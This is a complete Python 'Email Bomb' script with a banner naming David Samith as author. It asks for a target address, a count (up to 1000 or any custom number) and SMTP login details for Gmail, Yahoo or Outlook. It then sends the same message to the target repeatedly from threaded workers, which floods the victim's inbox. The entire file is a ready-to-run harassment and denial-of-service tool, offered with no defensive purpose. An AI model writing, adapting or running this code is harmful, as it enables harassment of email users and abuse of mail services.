import smtplib
import sys
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os
import threading

class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    RESET = '\033[0m'

def banner():
    print(bcolors.RED + '''
   EEEEE  M     M   AAAAA   III  L        BBBBB   OOOOO  M     M  BBBBB
   E      MM   MM  A     A   I   L        B    B O     O MM   MM  B    B
   EEEE   M M M M  AAAAAAA   I   L        BBBBB  O     O M M M M  BBBBB
   E      M  M  M  A     A   I   L        B    B O     O M  M  M  B    B
   EEEEE  M     M  A     A  III  LLLLL    BBBBB   OOOOO  M     M  BBBBB
    ''' + bcolors.YELLOW + '''
                       ====== Email Bomb ======
                        Author: David Samith
    ''' + bcolors.RESET)


class EmailBomber:
    count = 0

    def __init__(self):
        try:
            print(bcolors.CYAN + '\n[INITIALIZING PROGRAM]\n' + bcolors.RESET)
            self.target = str(input(bcolors.YELLOW + 'Enter target email: ' + bcolors.RESET))
            print(bcolors.GREEN + '\nBomb Modes:' + bcolors.RESET)
            print('1: 1000 emails\n2: 500 emails\n3: 250 emails\n4: 100 emails\n5: Custom')
            self.mode = int(input(bcolors.YELLOW + 'Enter bombing mode (1-5): ' + bcolors.RESET))
            if self.mode not in range(1, 6):
                print(bcolors.RED + 'ERROR: Invalid Option. Exiting...' + bcolors.RESET)
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')
            sys.exit(1)

    def bomb(self):
        try:
            print(bcolors.CYAN + '\n[SETTING UP BOMB]\n' + bcolors.RESET)
            if self.mode == 1:
                self.amount = 1000
            elif self.mode == 2:
                self.amount = 500
            elif self.mode == 3:
                self.amount = 250
            elif self.mode == 4:
                self.amount = 100
            else:
                self.amount = int(input(bcolors.YELLOW + 'Enter custom amount: ' + bcolors.RESET))
            print(bcolors.GREEN + f'\nSelected Mode: {self.mode} | Emails: {self.amount}\n' + bcolors.RESET)
        except Exception as e:
            print(f'ERROR: {e}')
            sys.exit(1)

    def email(self):
        try:
            print(bcolors.CYAN + '\n[SETTING UP EMAIL]\n' + bcolors.RESET)
            print('1: Gmail\n2: Yahoo\n3: Outlook')
            self.server = str(input(bcolors.YELLOW + 'Select email server (1-3) or enter custom: ' + bcolors.RESET))
            premade = {'1': 'smtp.gmail.com', '2': 'smtp.mail.yahoo.com', '3': 'smtp-mail.outlook.com'}
            self.port = 587 if self.server in premade else int(input(bcolors.YELLOW + 'Enter port: ' + bcolors.RESET))
            self.server = premade.get(self.server, self.server)

            self.fromAddr = str(input(bcolors.GREEN + 'Enter your email: ' + bcolors.RESET))
            self.fromPwd = str(input(bcolors.GREEN + 'Enter your app password: ' + bcolors.RESET))
            self.subject = str(input(bcolors.GREEN + 'Enter subject: ' + bcolors.RESET))
            self.message = str(input(bcolors.GREEN + 'Enter message: ' + bcolors.RESET))
            self.file_path = str(input(bcolors.GREEN + 'Enter file path to attach (leave blank if none): ' + bcolors.RESET)).strip()

            # Email creation
            self.msg = MIMEMultipart()
            self.msg['From'] = self.fromAddr
            self.msg['To'] = self.target
            self.msg['Subject'] = self.subject
            self.msg.attach(MIMEText(self.message, 'plain'))

            # File attachment
            if self.file_path and os.path.exists(self.file_path):
                attachment = MIMEBase('application', 'octet-stream')
                with open(self.file_path, 'rb') as file:
                    attachment.set_payload(file.read())
                encoders.encode_base64(attachment)
                attachment.add_header('Content-Disposition', f'attachment; filename={os.path.basename(self.file_path)}')
                self.msg.attach(attachment)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')
            sys.exit(1)

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg.as_string())
            self.count += 1
            print(bcolors.GREEN + f'Sent Email {self.count}/{self.amount}' + bcolors.RESET)
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        delay = 2
        threads = []
        for _ in range(self.amount):
            thread = threading.Thread(target=self.send)
            threads.append(thread)
            thread.start()
            time.sleep(delay)

        for thread in threads:
            thread.join()

        self.s.close()
        print(bcolors.RED + '\n[ATTACK COMPLETED]\n' + bcolors.RESET)


if __name__ == '__main__':
    banner()
    bomb = EmailBomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
